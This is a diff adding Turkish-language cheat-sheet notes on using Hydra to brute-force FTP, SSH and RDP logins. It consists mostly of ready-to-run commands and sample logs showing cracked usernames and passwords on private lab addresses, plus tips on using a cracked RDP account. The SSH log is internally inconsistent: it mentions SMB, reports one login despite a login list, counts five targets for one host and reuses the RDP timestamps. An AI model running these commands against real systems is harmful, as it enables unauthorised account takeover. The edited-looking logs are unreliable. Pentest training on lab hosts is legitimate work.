@@ -1,0 +1,53 @@
+Hydra Kullanımı
+
+Hydra Brute Force attacklar için kullanılmaktadır. XHydra üzerinden GUI'den de tarama başlatılabilir.
+
+Örnek Kullanımlar
+
+ hydra -l user -P passlist.txt ftp://192.168.0.1
+ hydra -l admin -p password ftp://[192.168.0.0/24]/
+ hydra -L logins.txt -P pws.txt -M targets.txt ssh
+-v Verbose ekleyebilir.
+
+#RDP Servisine yönelik BruteForce Yapma#
+hydra -l User -P password.txt IP rdp
+hydra -l User -P password.txt rdp://IP
+
+Örnek Brute Force Log'u
+└─# hydra -l msfadmin-2bb -P /root/Masaüstü/pass.txt 192.168.187.153 rdp 
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-29 15:54:06
+[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
+[DATA] max 1 task per 1 server, overall 1 task, 4 login tries (l:1/p:4), ~4 tries per task
+[DATA] attacking rdp://192.168.187.153:3389/
+[3389][rdp] host: 192.168.187.153   login: msfadmin-2bb   password: 407ea
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-12-29 15:54:07
+
+RDP kırma işlemi sonrasında Windows makine üzerinden işlem yapabileceğin gibi, FreeRDP, Xrdp gibi araçlarla bağlantı kurabilirsin.
+RDP üzerinden sürükleyerek dosya aktarımı yapabilirsin.
+--
+Hash hesaplamak içinde HashCal aracını kullanabilirsin.
+----------------------------------
+Remote Login SSH ya da Telnet
+#SSH Servisine yönelik Brute Force yapma
+
+Örnek Log
+└─# hydra -L User.txt -P pass.txt 192.168.187.153 ssh
+
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-29 15:54:06
+[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
+[DATA] max 1 task per 1 server, overall 1 task, 250 login tries (l:1/p:4), ~4 tries per task
+[DATA] attacking ssh://192.168.187.153:22/
+22[ssh] host: 192.168.187.153   login: root	  password: H0*ea497
+22[ssh] host: 192.168.187.153   login: toor       password: 407xy*m3
+22[ssh] host: 192.168.187.153   login: msfadmin   password: @l*ae101
+22[ssh] host: 192.168.187.153   login: 3bb        password: 0n*fx203
+22[ssh] host: 192.168.187.153   login: 2bb        password: 3*ealo03
+5 of 5 target successfully completed, 5 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-12-29 15:54:07
+
+---------------------------------
+
